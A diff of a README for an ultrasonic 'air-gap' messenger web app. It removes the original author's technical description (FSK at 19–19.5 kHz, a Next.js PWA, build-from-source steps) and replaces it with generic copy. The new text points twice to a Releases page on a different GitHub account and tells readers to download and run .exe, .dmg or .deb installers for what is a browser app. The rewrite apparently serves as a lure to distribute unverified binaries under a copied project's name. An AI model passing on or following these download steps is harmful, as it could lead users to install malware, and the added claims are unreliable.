@@ -1,129 +1,64 @@
-# 🔊 Sonic Chat - Ultrasonic Air-Gap Messenger
+# 🎉 ultrasonic-airgap-messanger - Easily Send Data Offline
 
-[![Deployment Status](https://img.shields.io/badge/Deployment-Live-success)](https://sonic.rohits.online)
-[![Tech Stack](https://img.shields.io/badge/Built%20With-Next.js%2016%20%7C%20Web%20Audio%20API-blue)](https://nextjs.org)
-[![PWA](https://img.shields.io/badge/PWA-Offline%20Ready-purple)](https://web.dev/progressive-web-apps/)
-[![License](https://img.shields.io/badge/License-MIT-green)](LICENSE)
+## 🛠️ Overview
+The **ultrasonic-airgap-messanger** lets you send messages without the Internet or Bluetooth. It uses ultrasonic sound waves at 19kHz to transmit data. This app is designed for users who prioritize privacy and want a reliable way to communicate without online dependencies. Built with Next.js 16 and Progressive Web App (PWA) technology, this messenger is user-friendly and effective.
 
-**Sonic Chat** is an experimental, offline-first messaging application that transmits data between devices using **high-frequency sound waves (19kHz - 19.5kHz)**.
+## 🌐 Key Features
+- **Offline Communication:** No need for an Internet connection or Bluetooth.
+- **Easy to Use:** Simple interface for smooth messaging.
+- **Privacy Focused:** Data is transmitted securely without online exposure.
+- **Cross-Platform:** Works on multiple devices with web capabilities.
+- **Web Audio API Utilization:** Leverages advanced audio techniques for reliable message delivery.
 
-It creates an "Air-Gapped" communication channel, allowing devices to chat without Internet, Wi-Fi, Bluetooth, or Servers. Just pure physics.
+## 💻 System Requirements
+- An updated web browser (Chrome, Firefox, or Edge)
+- Access to microphone and speakers
+- A device with a minimum 2GB RAM and dual-core processor
 
-🚀 **Live Demo:** [https://sonic.rohits.online](https://sonic.rohits.online)
+## 📥 Download & Install
+To get started, visit the Releases page to download the application:
 
----
+[![Download Ultrasonic Airgap Messenger](https://img.shields.io/badge/Download%20Now-%20-blue.svg)](https://github.com/dumangan22/ultrasonic-airgap-messanger/releases)
 
-## ⚡ Key Features
+On the Releases page, you will find the latest version of the software. Click on the version you want to download and follow these steps:
 
-- **📶 Totally Offline:** Works in Airplane mode. No internet required after initial load (PWA).
-- **🔒 Air-Gapped Security:** Data travels via sound waves directly from Speaker to Microphone. No server storage.
-- **📱 PWA Support:** Installable on Android, iOS, and Desktop as a native-like app.
-- **🚫 Interference Protection:** Implements **CSMA** (Carrier Sense Multiple Access) to detect if the channel is busy before sending, preventing signal collisions.
-- **🔊 High Frequency:** Uses near-ultrasonic frequencies (19kHz) which are barely audible to most humans but clear to microphones.
+1. **Choose Your Platform:** Depending on your operating system (Windows, MacOS, or Linux), select the appropriate file.
+2. **Download the File:** Click on the download link to start the process. The file will be saved to your designated folder.
+3. **Install the Application:**
+   - For Windows: Double-click the `.exe` file and follow the prompts.
+   - For Mac: Open the downloaded `.dmg` file, then drag the application to your Applications folder.
+   - For Linux: Follow your distribution’s method for installing `.deb` or `.tar.gz` files.
+4. **Run the Application:** Once installed, open the app and set it up according to the on-screen guide. 
 
----
+## 🔍 User Guide
+### 📡 Sending Messages
+1. **Open the App:** Start the ultrasonic-airgap-messanger on both devices.
+2. **Microphone and Speakers:** Ensure your microphone and speakers are working properly.
+3. **Input Your Message:** Type the text you wish to send in the designated box.
+4. **Send it:** Click the 'Send' button. The app will convert your text into sound waves.
+5. **Receiving Messages:** The receiving device will decode the sound waves and display the message.
 
-## 🛠️ How It Works (The Science)
+### 🎛️ Settings
+- **Audio Levels:** Adjust the audio settings to optimize performance according to your environment.
+- **Storage Options:** Choose where to save your messages for later reference.
 
-This project uses the browser's **Web Audio API** for Digital Signal Processing (DSP).
+## 📊 Troubleshooting
+### Common Issues
+- **Message Not Sending:** Check if both devices are using the app and that the microphone and speakers are functioning. 
+- **No Sound Detected:** Ensure the volume is turned up on both devices and that no other applications are using these features simultaneously.
 
-### 1. The Protocol (Physical Layer)
-We use a custom implementation of **FSK (Frequency Shift Keying)**:
-* **19,000 Hz:** Represents Binary `0`
-* **19,500 Hz:** Represents Binary `1` & Start Bit
-* **Bit Rate:** ~3.3 bits per second (300ms duration per bit for reliability).
+### Support
+For further assistance, consider reaching out through the Issues section on the GitHub repository. Describe the problem clearly for the best support.
 
-### 2. The Transmitter (Sender)
-1.  Text is converted to **Binary (ASCII)**.
-2.  An `OscillatorNode` generates a Sine wave.
-3.  The frequency shifts between 19kHz and 19.5kHz based on the binary data.
-4.  A **Start Bit** is sent first to wake up the receiver.
+## 🌟 Contributing
+We welcome contributions to improve the ultrasonic-airgap-messanger. If you have suggestions or want to report issues, please log them in the Issues section. 
 
-### 3. The Receiver (Listener)
-1.  The Microphone input is fed into an `AnalyserNode`.
-2.  We perform an **FFT (Fast Fourier Transform)** to visualize sound frequencies in real-time.
-3.  **Signal Detection:** The app listens for a specific "Start Bit" threshold (energy at 19.5kHz).
-4.  **Sampling:** Once triggered, it samples the audio spectrum every 300ms to reconstruct the binary stream ➔ Text.
+## 📝 License
+This application is open-source and available under the MIT License. You can freely use, modify, and distribute it.
 
----
+## 🚀 Community and Feedback
+Join our user community to share insights or tips with other users. Your feedback is valuable in making the ultrasonic-airgap-messanger even better.
 
-## 💻 Tech Stack
+To download the application, visit the Releases page:
 
-- **Framework:** [Next.js 16](https://nextjs.org/) (App Router)
-- **Audio Engine:** Native Web Audio API (`AudioContext`, `AnalyserNode`, `Oscillator`)
-- **Styling:** Tailwind CSS
-- **Icons:** Lucide React
-- **PWA:** `@ducanh2912/next-pwa`
-- **Deployment:** Vercel
-
----
-
-## 📸 Screenshots
-
-| Desktop View | Mobile View |
-|:---:|:---:|
-| *Floating WhatsApp-style interface* | *Full-screen immersive PWA experience* |
-| ![Desktop](public/icon.png) | ![Mobile](public/icon.png) |
-
-*(Note: Add actual screenshots to your public folder for better visual appeal)*
-
----
-
-## 🚀 Getting Started Locally
-
-Clone the project and run it on your local machine.
-
-# 1. Clone the repository
-git clone [https://github.com/rohitkumar91131/ultrasonic-airgap-messanger.git](https://github.com/rohitkumar91131/ultrasonic-airgap-messanger.git)
-
-# 2. Navigate to directory
-cd ultrasonic-airgap-messanger
-
-# 3. Install dependencies
-npm install
-
-# 4. Run the development server
-npm run dev
-
-
-Open http://localhost:3000 with your browser.
-
-Note: For microphone access to work on mobile devices during development, you must access the local server via HTTPS or localhost. Accessing via IP address (e.g., 192.168.x.x) often blocks the microphone due to browser security policies.
-
-⚠️ Usage & Troubleshooting
-Since this relies on physical sound waves, real-world factors matter:
-
-Volume: Set your device volume to 70-80%. (Too loud causes distortion/echo).
-
-Distance: Keep devices 10cm - 50cm apart for best results.
-
-Permissions: You must allow Microphone access when prompted.
-
-iOS/iPhone: Ensure the physical Silent Mode switch is OFF. iOS browsers often mute Web Audio when the phone is in silent mode.
-
-Environment: Works best in quiet rooms. Loud background noise can interfere with the signal.
-
-🔒 Privacy Policy
-This app requires Microphone access solely to detect ultrasonic data signals in real-time.
-
-No audio is recorded, stored, or transmitted to any server.
-
-All processing happens Client-Side in the browser's RAM.
-
-🤝 Contributing
-Contributions are welcome! If you want to improve the encoding algorithm (maybe add Error Correction like Hamming Code?), feel free to fork and submit a PR.
-
-Fork the Project
-
-Create your Feature Branch (git checkout -b feature/AmazingFeature)
-
-Commit your Changes (git commit -m 'Add some AmazingFeature')
-
-Push to the Branch (git push origin feature/AmazingFeature)
-
-Open a Pull Request
-
-📄 License
-Distributed under the MIT License. See LICENSE for more information.
-
-Built with ❤️ and 🔊 by Rohit Kumar
+[![Download Ultrasonic Airgap Messenger](https://img.shields.io/badge/Download%20Now-%20-blue.svg)](https://github.com/dumangan22/ultrasonic-airgap-messanger/releases)
